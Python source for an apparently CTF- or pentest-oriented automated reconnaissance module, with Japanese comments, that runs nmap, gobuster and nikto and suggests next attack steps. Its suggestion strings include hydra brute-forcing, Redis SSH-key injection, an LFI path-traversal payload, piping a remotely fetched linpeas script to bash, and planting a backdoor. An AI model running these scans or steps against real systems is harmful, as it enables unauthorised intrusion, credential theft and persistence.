"""
Autonomous Reconnaissance Module - 自律的情報収集と攻撃面分析

ターゲットの自動列挙、サービス検出、脆弱性マッピング、攻撃ベクトル特定
研究目的専用 - 許可のないシステムへの使用は違法です
"""

import asyncio
import re
import sys
from typing import Optional, Dict, List, Any
from datetime import datetime


class AutoRecon:
    """自律偵察 - 自動情報収集とSmart Attack Surface Analysis"""

    def __init__(self):
        self.default_timeout = 600
        self.results_cache = {}

    async def _run_command(self, cmd: list, timeout: int = None) -> str:
        """コマンドを非同期で実行"""
        if timeout is None:
            timeout = self.default_timeout

        try:
            print(f"[RECON] Executing: {' '.join(cmd)}", file=sys.stderr)

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )

            output = stdout.decode('utf-8', errors='ignore')
            error = stderr.decode('utf-8', errors='ignore')

            return output if output else error

        except asyncio.TimeoutError:
            return f"[TIMEOUT] Command timed out after {timeout}s"
        except Exception as e:
            return f"[ERROR] {str(e)}"

    # ==========================================================================
    # 完全自動偵察
    # ==========================================================================

    async def full_recon(self, target: str) -> str:
        """ターゲットに対する完全自動偵察

        Args:
            target: ターゲットIPまたはホスト名
        """
        results = [f"=== FULL AUTONOMOUS RECONNAISSANCE ==="]
        results.append(f"Target: {target}")
        results.append(f"Started: {datetime.now().isoformat()}\n")

        # Phase 1: Port Scan
        results.append("=" * 60)
        results.append("📡 Phase 1: Port Scanning")
        results.append("=" * 60)

        # Quick scan first
        quick_scan = await self._run_command(
            ["nmap", "-sT", "-T4", "--top-ports", "1000", "-oG", "-", target],
            timeout=300
        )
        results.append("【Quick Scan (Top 1000)】")
        results.append(quick_scan)

        # Extract open ports
        open_ports = self._extract_ports(quick_scan)
        results.append(f"\n🔓 Open Ports Found: {', '.join(map(str, open_ports))}\n")

        # Detailed version scan on open ports
        if open_ports:
            results.append("【Detailed Service Scan】")
            port_str = ','.join(map(str, open_ports))
            detailed = await self._run_command(
                ["nmap", "-sV", "-sC", "-p", port_str, target],
                timeout=600
            )
            results.append(detailed)

        # Phase 2: Service Enumeration
        results.append("\n" + "=" * 60)
        results.append("🔍 Phase 2: Service Enumeration")
        results.append("=" * 60)

        # Web services
        web_ports = [p for p in open_ports if p in [80, 443, 8080, 8443, 8000, 3000, 5000]]
        if web_ports:
            results.append("\n【Web Services Detected】")
            for port in web_ports:
                proto = "https" if port in [443, 8443] else "http"
                url = f"{proto}://{target}:{port}"
                results.append(f"\n--- {url} ---")

                # WhatWeb
                whatweb = await self._run_command(["whatweb", "-a", "3", url], timeout=60)
                results.append(f"WhatWeb: {whatweb[:500]}")

        # SSH
        if 22 in open_ports:
            results.append("\n【SSH Service】")
            ssh_scan = await self._run_command(
                ["nmap", "-p22", "--script=ssh-auth-methods,ssh2-enum-algos", target],
                timeout=60
            )
            results.append(ssh_scan)

        # SMB
        if 445 in open_ports or 139 in open_ports:
            results.append("\n【SMB Service】")
            smb_scan = await self._run_command(
                ["nmap", "-p445,139", "--script=smb-enum-shares,smb-os-discovery,smb-vuln*", target],
                timeout=120
            )
            results.append(smb_scan)

        # FTP
        if 21 in open_ports:
            results.append("\n【FTP Service】")
            ftp_scan = await self._run_command(
                ["nmap", "-p21", "--script=ftp-anon,ftp-syst,ftp-vsftpd-backdoor", target],
                timeout=60
            )
            results.append(ftp_scan)

        # Phase 3: Attack Surface Analysis
        results.append("\n" + "=" * 60)
        results.append("⚔️ Phase 3: Attack Surface Analysis")
        results.append("=" * 60)

        attack_vectors = self._analyze_attack_surface(open_ports, '\n'.join(results))
        results.append(attack_vectors)

        # Save results
        self.results_cache[target] = {
            'timestamp': datetime.now().isoformat(),
            'ports': open_ports,
            'raw_results': '\n'.join(results)
        }

        results.append(f"\n\n📊 Completed: {datetime.now().isoformat()}")
        return '\n'.join(results)

    def _extract_ports(self, nmap_output: str) -> List[int]:
        """Nmapの出力からオープンポートを抽出"""
        ports = []
        # grepable format: Ports: 22/open/tcp//ssh//...
        grepable = re.findall(r'(\d+)/open', nmap_output)
        ports.extend([int(p) for p in grepable])

        # Normal format: 22/tcp open ssh
        normal = re.findall(r'(\d+)/tcp\s+open', nmap_output)
        ports.extend([int(p) for p in normal])

        return sorted(list(set(ports)))

    def _analyze_attack_surface(self, ports: List[int], scan_results: str) -> str:
        """攻撃面を分析し推奨アクションを生成"""
        analysis = []
        priority_high = []
        priority_medium = []
        priority_low = []

        # Web Analysis
        web_ports = [p for p in ports if p in [80, 443, 8080, 8443, 8000, 3000, 5000]]
        if web_ports:
            priority_high.append(f"""
🌐 Web Services (Ports: {web_ports})
   ├─ ディレクトリ列挙: gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
   ├─ 脆弱性スキャン: nikto -h http://target
   ├─ 技術スタック特定: whatweb -a 3 http://target
   └─ SQLi/XSS テスト: 手動またはsqlmap""")

        # SSH Analysis
        if 22 in ports:
            priority_medium.append("""
🔐 SSH (Port 22)
   ├─ ユーザー列挙: auxiliary/scanner/ssh/ssh_enumusers
   ├─ ブルートフォース: hydra -L users.txt -P passwords.txt ssh://target
   └─ 既知の脆弱性確認: searchsploit openssh""")

        # FTP Analysis
        if 21 in ports:
            anonymous = "anonymous FTP" in scan_results.lower()
            if anonymous:
                priority_high.append("""
📁 FTP (Port 21) - ANONYMOUS ACCESS!
   ├─ Anonymous login: ftp target (user: anonymous)
   ├─ ファイル確認とダウンロード
   └─ 書き込み権限確認: put test.txt""")
            else:
                priority_medium.append("""
📁 FTP (Port 21)
   ├─ ブルートフォース: hydra -L users.txt -P passwords.txt ftp://target
   └─ 既知の脆弱性: searchsploit vsftpd""")

        # SMB Analysis
        if 445 in ports or 139 in ports:
            priority_high.append("""
📂 SMB (Port 445/139)
   ├─ 共有列挙: smbclient -L //target -N
   ├─ 列挙詳細: enum4linux target
   ├─ 脆弱性 (EternalBlue): nmap --script=smb-vuln-ms17-010
   └─ null session: rpcclient -U "" -N target""")

        # MySQL
        if 3306 in ports:
            priority_medium.append("""
🗄️ MySQL (Port 3306)
   ├─ ブルートフォース: hydra -L users.txt -P passwords.txt mysql://target
   ├─ デフォルト認証: mysql -h target -u root -p
   └─ UDF exploit (root権限時): lib_mysqludf_sys""")

        # Redis
        if 6379 in ports:
            priority_high.append("""
🔴 Redis (Port 6379) - 通常認証なし!
   ├─ 接続: redis-cli -h target
   ├─ 情報取得: INFO
   ├─ SSH key injection:
   │   CONFIG SET dir /root/.ssh
   │   CONFIG SET dbfilename authorized_keys
   └─ Webshell書き込み可能性あり""")

        # Compile results
        analysis.append("\n【優先度: 高】")
        if priority_high:
            analysis.extend(priority_high)
        else:
            analysis.append("   なし")

        analysis.append("\n【優先度: 中】")
        if priority_medium:
            analysis.extend(priority_medium)
        else:
            analysis.append("   なし")

        analysis.append("\n【優先度: 低】")
        if priority_low:
            analysis.extend(priority_low)
        else:
            analysis.append("   通常ポート監視")

        return '\n'.join(analysis)

    # ==========================================================================
    # Web専用偵察
    # ==========================================================================

    async def web_recon(self, url: str) -> str:
        """Web専用の詳細偵察

        Args:
            url: ターゲットURL
        """
        results = [f"=== WEB RECONNAISSANCE ==="]
        results.append(f"Target: {url}")
        results.append(f"Started: {datetime.now().isoformat()}\n")

        # WhatWeb
        results.append("【技術スタック検出】")
        whatweb = await self._run_command(["whatweb", "-a", "3", url], timeout=60)
        results.append(whatweb)

        # Directory enumeration
        results.append("\n【ディレクトリ列挙】")
        gobuster = await self._run_command([
            "gobuster", "dir", "-u", url,
            "-w", "/usr/share/wordlists/dirb/common.txt",
            "-t", "20", "-q"
        ], timeout=300)
        results.append(gobuster[:2000])  # Limit output

        # Nikto
        results.append("\n【脆弱性スキャン (Nikto)】")
        nikto = await self._run_command(
            ["nikto", "-h", url, "-maxtime", "300s", "-nointeractive"],
            timeout=350
        )
        results.append(nikto[:3000])

        # Analysis
        results.append("\n【推奨アクション】")
        recommendations = self._analyze_web_results('\n'.join(results))
        results.append(recommendations)

        return '\n'.join(results)

    def _analyze_web_results(self, results: str) -> str:
        """Web調査結果を分析"""
        suggestions = []
        results_lower = results.lower()

        # CMS Detection
        if "wordpress" in results_lower:
            suggestions.append("✅ WordPress検出 → wpscan --url URL -e ap,at,u")
        if "joomla" in results_lower:
            suggestions.append("✅ Joomla検出 → joomscan -u URL")
        if "drupal" in results_lower:
            suggestions.append("✅ Drupal検出 → droopescan scan drupal -u URL")

        # Vulnerabilities
        if "php" in results_lower:
            suggestions.append("⚠️ PHP検出 → LFIテスト: ?page=../../etc/passwd")
        if "upload" in results_lower or "file" in results_lower:
            suggestions.append("⚠️ Upload機能検出 → ファイルアップロード脆弱性テスト")
        if "login" in results_lower or "admin" in results_lower:
            suggestions.append("⚠️ ログイン検出 → ブルートフォース / SQLi")

        if not suggestions:
            suggestions.append("手動でのパラメータテストを推奨")

        return '\n'.join(suggestions)

    # ==========================================================================
    # 次のアクション提案
    # ==========================================================================

    def suggest_next_action(self, target: str, current_state: str) -> str:
        """現在の状態から次のアクションを提案

        Args:
            target: ターゲット
            current_state: 現在の状態説明
        """
        state_lower = current_state.lower()
        suggestions = []

        suggestions.append(f"=== 次のアクション提案 ===")
        suggestions.append(f"Target: {target}")
        suggestions.append(f"Current State: {current_state}\n")

        # 初期段階
        if any(word in state_lower for word in ["initial", "start", "始め", "最初"]):
            suggestions.append("""【推奨】初期偵察フェーズ
1. ポートスキャン: nmap -sV -sC -p- target
2. 基本情報収集: whois, dig, nslookup
3. Web確認: curl -I http://target""")

        # ポートスキャン完了
        elif any(word in state_lower for word in ["port", "scan", "ポート"]):
            suggestions.append("""【推奨】サービス列挙フェーズ
1. Web (80/443): gobuster, nikto, whatweb
2. SSH (22): ユーザー列挙, ブルートフォース
3. SMB (445): enum4linux, smbclient
4. 脆弱性検索: searchsploit [service_version]""")

        # Web発見
        elif any(word in state_lower for word in ["web", "http", "80", "443"]):
            suggestions.append("""【推奨】Web深掘りフェーズ
1. ディレクトリ: gobuster dir -u URL -w wordlist
2. サブドメイン: gobuster dns -d domain -w wordlist
3. パラメータファジング: wfuzz -c -z file,params.txt URL?FUZZ=test
4. SQLi: sqlmap -u "URL?param=1" --dbs
5. LFI: ?page=../../etc/passwd""")

        # Credential発見
        elif any(word in state_lower for word in ["credential", "password", "user", "cred"]):
            suggestions.append("""【推奨】認証突破フェーズ
1. SSH試行: ssh user@target
2. SMB試行: smbclient //target/share -U user
3. Web login試行: 発見したcredentialでログイン
4. パスワード再利用確認""")

        # シェル取得
        elif any(word in state_lower for word in ["shell", "access", "アクセス", "侵入"]):
            suggestions.append("""【推奨】ポストエクスプロイトフェーズ
1. シェル安定化: python3 -c 'import pty;pty.spawn("/bin/bash")'
2. 権限確認: id, whoami, sudo -l
3. ファイル探索: find / -perm -u=s 2>/dev/null
4. LinPEAS実行: curl URL/linpeas.sh | bash
5. 機密ファイル: /etc/passwd, ~/.ssh, 設定ファイル""")

        # root取得
        elif any(word in state_lower for word in ["root", "admin", "privilege", "権限"]):
            suggestions.append("""【推奨】フラグ回収・持続化
1. フラグ確認: cat /root/root.txt
2. 証跡確保: スクリーンショット, ログ保存
3. バックドア設置 (研究目的のみ)
4. レポート作成""")

        else:
            suggestions.append("""【一般推奨】
1. 状況を詳しく説明してください
2. 発見した情報をリストアップ
3. 試行済みアクションを記載""")

        return '\n'.join(suggestions)

    # ==========================================================================
    # ステータス
    # ==========================================================================

    async def get_status(self) -> str:
        """ステータスを取得"""
        cached = len(self.results_cache)
        return f"""=== Auto Recon Module Status ===

✅ 完全自動偵察: full_recon(target)
✅ Web専用偵察: web_recon(url)
✅ 攻撃面分析: 自動ポート/サービス分析
✅ 次アクション提案: suggest_next_action

📊 キャッシュ済みターゲット: {cached}
"""
